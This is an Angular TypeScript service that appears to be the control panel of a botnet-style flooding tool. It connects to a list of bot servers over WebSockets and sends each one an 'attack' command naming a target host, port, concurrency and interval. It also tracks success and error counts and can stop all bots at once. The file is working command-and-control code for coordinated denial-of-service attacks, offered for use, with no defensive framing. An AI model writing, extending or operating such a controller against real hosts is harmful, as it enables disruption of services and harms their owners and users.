import { HttpClient } from '@angular/common/http';
import { Injectable } from '@angular/core';
import { first, map, Observable, tap } from 'rxjs';

export class Bot {
  private socket: WebSocket;

  loop: number;
  success: number;
  error: number;
  status: 'working' | 'idle' | 'offline';
  target: AttackInfo | null;

  constructor(public readonly botUrl: string) {
    const wshost = botUrl.replace(/^http/, 'ws');

    this.loop = 0;
    this.error = 0;
    this.success = 0;
    this.status = 'idle';
    this.target = null;

    this.socket = new WebSocket(wshost);
    this.socket.onclose = () => this.status = 'offline';
    this.socket.onmessage = (ev) => this.onMessage(ev.data ? JSON.parse(ev.data) : null);
    this.socket.onopen = () => console.log('Client connected');
  }

  attack(info: AttackInfo) {
    if(this.status !== 'offline') {
      this.socket.send(JSON.stringify({cmd: 'attack', data: info}));
      this.status = 'working';
      this.target = info;
    }
  }

  stop() {
    if(this.status !== 'offline') {
      this.socket.send(JSON.stringify({cmd: 'stop', data: null}));
      this.status = 'idle';
      this.target = null;
    }
  }

  private onMessage(data: any) {
    this.loop = data.loop;
    this.success = data.success;
    this.error = data.error;
    this.target = data.target;
  }
}

export interface AttackInfo {
  host: string;
  port: number;
  concurrency?: number;
  interval?: number;
}

@Injectable({
  providedIn: 'root'
})
export class AppService {
  readonly botList: Bot[] = [];

  constructor(private httpClient: HttpClient) { }

  refreshList() {
    this.httpClient.get<string[]>('/api/control').pipe(
      tap(botUrls => {
        botUrls.forEach(url => {
          if(!this.botList.find(b => b.botUrl === url)) {
            this.botList.push(new Bot(url));
          }
        });
      }),
      first(),
    ).subscribe();
  }

  attack(info: AttackInfo) {
    this.botList.forEach(bot => {
      bot.attack(info);
    });
  }

  stop() {
    this.botList.forEach(bot => {
      bot.stop();
    });
  }
}
